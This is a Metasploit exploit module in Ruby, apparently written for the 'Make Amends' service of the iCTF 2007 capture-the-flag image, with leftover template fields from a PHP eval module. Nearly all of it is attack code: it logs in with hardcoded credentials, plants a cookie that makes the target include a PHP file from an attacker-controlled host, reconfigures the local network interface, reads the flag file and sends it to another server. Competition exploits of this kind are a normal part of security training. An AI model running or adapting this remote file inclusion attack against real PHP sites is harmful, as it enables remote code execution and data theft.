##
# $Id: php_eval.rb 14774 2012-02-21 01:42:17Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rubygems'
require 'ruby-debug'
require 'base64'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'make amends of ictf2007',
			'Description'    => %q{
				Exploit Make Amends service of ictf2007 image
			},
			'Author'         => [ 'egypt' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 14774 $',
			'References'     => [ ],
			'Privileged'     => false,
			'Platform'       => ['php'],
			'Arch'           => ARCH_PHP,
			'Payload'        =>
				{
					# max header length for Apache,
					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
					'Space'       => 8190,
					# max url length for some old versions of apache according to
					# http://www.boutell.com/newfaq/misc/urllength.html
					#'Space'       => 4000,
					'DisableNops' => true,
					'BadChars'    => %q|'"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Keys'        => ['php'],
				},
			'DisclosureDate' => 'Oct 13 2008',
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget' => 0
			))

		register_options(
			[
				OptString.new('URIPATH',   [ true,  "The URI to request, with the eval()'d parameter changed to !CODE!", '/test.php?evalme=!CODE!']),
			], self.class)

	end

	def check
		uri = "http://169.254.236.101/~amends/amends.php";
		print_status("Checking uri #{uri}")
		response = send_request_raw({ 'uri' => uri})
		if response.code == 200
			return Exploit::CheckCode::Detected
		end
		print_error("Server responded with #{response.code}")
		return Exploit::CheckCode::Safe
	end

	def exploit
		# very short timeout because the request may never return if we're
		# sending a socket payload
		timeout = 0.01

		datastore["RHOST"] = "169.254.236.102";

		# 1. ----------- GET SESSION TOKEN--------------------------
		system("ifconfig eth0 169.254.236.111")
		emailaddr = "jnice@gmail.com";
		passwd = "jnice";
		params = "email="+ Rex::Text.uri_encode("#{emailaddr}") + "&password="+Rex::Text.uri_encode("#{passwd}");
		print_status("Params are: #{params}")
		uri = "http://169.254.236.102/~copyright/cgi-bin/login.php?" + params;
		print_status("Sending request for: #{uri}")
		iLength = params.length;
		response = send_request_raw({
				'method' => 'POST',
				'global' => true,
				'uri' => uri,
				'headers' => {
						'Content-Type' => 'application/x-www-form-urlencoded',
						'Content-Length' => iLength.to_s
					},
				'data' => params
			},timeout)
		print_error("Code is #{response.code}#");
		print_error("Response is #{response.headers}#");
		sessionid = response.headers['Set-Cookie']
		print_status("session id: " + sessionid);
		if response and response.code != 200
			print_error("Server returned non-200 status code (#{response.code})")
		end

		# 2. --------------- SEND THE FILE -----------------------------
		system("ifconfig eth0 169.254.236.112")
		uri = "http://169.254.236.102/~copyright/cgi-bin/star.php";
		print_status("Sending request for: #{uri}");
		sessionid = sessionid + "; travelscripts=" + "http://169.254.236.112/ltr3.inc";

		print_error("SESSION is #{sessionid}");
		response = send_request_raw({
				'global' => true,
				'uri' => uri,
				'headers' => {
						'Connection' => 'close',
						'Cookie' => sessionid 
					}
			},timeout)
		print_error("response body is #{response.body}");

		system("ifconfig eth0 169.254.236.111")

		# 3. ----------------- SEND THE FILE --------------------------

		uri = "http://169.254.236.102/~copyright/flag.txt";
		print_status("Sending request for: #{uri}")

		response = send_request_raw({
				'global' => true,
				'uri' => uri,
				'headers' => {
						'Connection' => 'close',
					}
			},timeout)
		print_error("response body is #{response.body}");

		arrMatch = response.body.scan(/FLG\S*/);
		ccnum = arrMatch[0];
#--------------------------------upload flag (4)-------------	
		uri = "http://169.254.236.101/forward.php?flag=#{ccnum}";
		datastore["RHOST"] = "169.254.236.101";
		print_status("Sending request for: #{uri}");

		response = send_request_raw({
				'global' => true,
				'uri' => uri,
				'headers' => {
						'Connection' => 'close',
					}
			},timeout)
		print_error("response body is #{response.body}");

		handler
	end
end
